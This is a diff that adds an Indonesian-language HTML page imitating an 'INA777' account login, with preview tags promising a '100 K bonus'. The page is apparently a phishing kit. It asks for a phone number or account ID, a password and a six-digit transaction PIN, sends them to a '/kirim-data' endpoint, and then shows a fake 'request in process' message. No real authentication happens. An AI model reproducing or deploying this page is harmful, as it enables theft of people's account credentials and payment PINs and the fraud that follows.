@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF‑8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:title" content="Klaim Bonus 100 K Sekarang!">
+<meta property="og:description" content="Klaim bonus terbatas untuk pengguna baru, buka tautan di bawah ini">
+<meta property="og:image" content="https://raw.githubusercontent.com/predi1998a-oss/Ina777/refs/heads/main/src/IMG_20261022_120451_172.jpg">
+
+<title>INA777 - Masuk Akun</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="latar-penuh"></div>
+  <div class="container">
+    <button class="close-btn">✕</button>
+
+    <!-- Halaman Login -->
+    <div class="halaman aktif" id="halaman-login">
+      <div class="header-top">
+        <div class="judul-halaman">Akun Masuk</div>
+      </div>
+      <div class="form-box">
+        <div class="tab-bar">
+          <div class="tab active" onclick="gantiTab('hp')">Nomor HP</div>
+          <div class="tab" onclick="gantiTab('id')">ID</div>
+        </div>
+        <p class="note-red">* Harap masukkan informasi yang terikat untuk masuk</p>
+        <div class="form-group">
+          <label class="label" id="labelUtama">Nomor Telepon</label>
+          <div class="input-wrapper">
+            <input type="tel" id="inputUtama" placeholder="Masukkan nomor telepon">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="label">Kata Sandi</label>
+          <div class="input-wrapper">
+            <input type="password" id="kataSandi" placeholder="Masukkan kata sandi">
+          </div>
+        </div>
+        <div class="button-row">
+          <button class="btn btn-daftar">Daftar</button>
+          <button class="btn btn-login" onclick="bukaHalaman('pin')">Login</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Halaman PIN -->
+    <div class="halaman" id="halaman-pin">
+      <div class="header-top">
+        <div class="judul-halaman">PIN Transaksi</div>
+      </div>
+      <div class="pin-box">
+        <div class="pin-judul">Masukkan PIN Transaksi</div>
+        <p class="pin-keterangan">Masukkan 6 angka PIN</p>
+        <div class="pin-container">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="0" inputmode="numeric">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="1" inputmode="numeric">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="2" inputmode="numeric">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="3" inputmode="numeric">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="4" inputmode="numeric">
+          <input type="text" class="pin-input-kotak" maxlength="1" data-index="5" inputmode="numeric">
+        </div>
+        <button class="btn-lanjut" onclick="kirimData()">Lanjut</button>
+      </div>
+    </div>
+
+    <!-- Halaman Terima Kasih -->
+    <div class="halaman" id="halaman-terima">
+      <div class="header-top">
+        <div class="judul-halaman">Pemberitahuan</div>
+      </div>
+      <div class="terima-kasih-box">
+        <div class="terima-kasih-judul">Terima Kasih</div>
+        <p class="terima-kasih-teks">Permintaan Anda sedang dalam proses,<br>mohon ditunggu.</p>
+      </div>
+    </div>
+  </div>
+
+<script>
+let modeSekarang = 'hp';
+const pinKotak = document.querySelectorAll('.pin-input-kotak');
+
+// Ganti tab HP / ID
+function gantiTab(jenis) {
+  modeSekarang = jenis;
+  const label = document.getElementById('labelUtama');
+  const input = document.getElementById('inputUtama');
+  document.querySelectorAll('.tab')[0].classList.toggle('active', jenis === 'hp');
+  document.querySelectorAll('.tab')[1].classList.toggle('active', jenis === 'id');
+  if (jenis === 'hp') {
+    label.textContent = 'Nomor Telepon';
+    input.placeholder = 'Masukkan nomor telepon';
+    input.type = 'tel';
+  } else {
+    label.textContent = 'ID Akun';
+    input.placeholder = 'Masukkan ID akun anda';
+    input.type = 'text';
+  }
+}
+
+// Buka halaman tertentu
+function bukaHalaman(nama) {
+  document.querySelectorAll('.halaman').forEach(el => el.classList.remove('aktif'));
+  document.getElementById('halaman-' + nama).classList.add('aktif');
+  // Fokus kotak PIN saat halaman PIN terbuka
+  if (nama === 'pin') pinKotak[0].focus();
+}
+
+// Ambil nilai PIN
+function ambilPIN() {
+  return Array.from(pinKotak).map(i => i.value).join('');
+}
+
+// Logika input PIN
+pinKotak.forEach((input, idx) => {
+  input.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    if (e.target.value && idx < 5) pinKotak[idx + 1].focus();
+  });
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !e.target.value && idx > 0) pinKotak[idx - 1].focus();
+  });
+});
+
+// Kirim data ke server
+async function kirimData() {
+  const data = {
+    id: document.getElementById('inputUtama').value,
+    sandi: document.getElementById('kataSandi').value,
+    pin: ambilPIN()
+  };
+
+  if (data.pin.length !== 6) {
+    alert('Harap masukkan 6 angka PIN dengan lengkap!');
+    pinKotak[0].focus();
+    return;
+  }
+
+  try {
+    const res = await fetch('/kirim-data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    if (res.ok) bukaHalaman('terima');
+  } catch (err) {
+    alert('Gagal mengirim data, coba lagi!');
+  }
+}
+</script>
+</body>
+</html>
